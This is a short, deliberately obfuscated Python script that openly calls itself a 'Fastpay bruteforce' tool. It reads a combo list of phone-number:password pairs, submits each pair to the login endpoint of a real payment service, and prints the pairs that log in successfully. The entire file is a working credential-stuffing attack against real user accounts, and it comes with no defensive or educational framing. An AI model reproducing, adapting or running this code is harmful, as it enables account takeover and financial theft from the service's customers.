import requests
from multiprocessing.dummy import Pool,Lock

jojojojojojojojojojojjjjjojojoj = " -<>- Fastpay bruteforce - 2020/2021"

def xjjqsijqjsi139239189121i9wi29wsi92i(xx9977112312s21212s, nqjisjiwqjijjsowksowkso02012):
    linkakaaqggq = "https://secure.fast-pay.cash/"
    tfxasqaz = linkakaaqggq + "login"
    tfedwsqs = requests.Session()
    sijwijsiwj = tfedwsqs .get(tfxasqaz)
    xjisjiwjsiwijsi23uu12wusjujiqjsijwijs = sijwijsiwj.cookies.get_dict()
    hswiqjsiwjiq9391821i29s9w2js91229191 = {
        "mobile_no": xx9977112312s21212s,
        "password": nqjisjiwqjijjsowksowkso02012}
    tfgaw = (" > [N:{}] and [P:{}] > Successfull ").format(xx9977112312s21212s,nqjisjiwqjijjsowksowkso02012)
    xkgaw = (" > [N:{}] and [P:{}] > Failed ").format(xx9977112312s21212s,nqjisjiwqjijjsowksowkso02012)
    jwsjjwisqjijsijqwiwjsiqsjwsqissjqisiqijsiqjjsijsi = {"User-Agent": "Mozilla/5.0 (Fastpay-Bruteforce) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    xlxwowksokw = tfedwsqs.post(tfxasqaz, data=hswiqjsiwjiq9391821i29s9w2js91229191, headers=jwsjjwisqjijsijqwiwjsiqsjwsqissjqisiqijsiqjjsijsi, cookies=xjisjiwjsiwijsi23uu12wusjujiqjsijwijs)
    if xlxwowksokw.url == linkakaaqggq:
        print(tfgaw)
    else:
        print(xkgaw)

def massxsmi1iw2i2i2sji2siqisjiqjsi(sjiw1ijsi2sji2jijsijsiqjisji2jijijqiqjis):
    with open(sjiw1ijsi2sji2jijsijsiqjisji2jijijqiqjis, "r") as fxwiqjsiqjisi22qjisjiqjsijiwjiqjsijiqw:
        for line in fxwiqjsiqjisi22qjisjiqjsijiwjiqjsijiqw:
            credentials = line.strip().split(":")
            xx9977112312s21212s = credentials[0]
            nqjisjiwqjijjsowksowkso02012 = credentials[1]
            xjjqsijqjsi139239189121i9wi29wsi92i(xx9977112312s21212s, nqjisjiwqjijjsowksowkso02012)
print(jojojojojojojojojojojjjjjojojoj)
sjiw1ijsi2sji2jijsijsiqjisji2jijijqiqjis = raw_input("combo/file (numb:pass) -> ")
massxsmi1iw2i2i2sji2siqisjiqjsi(sjiw1ijsi2sji2jijsijsiqjisji2jijijqiqjis)
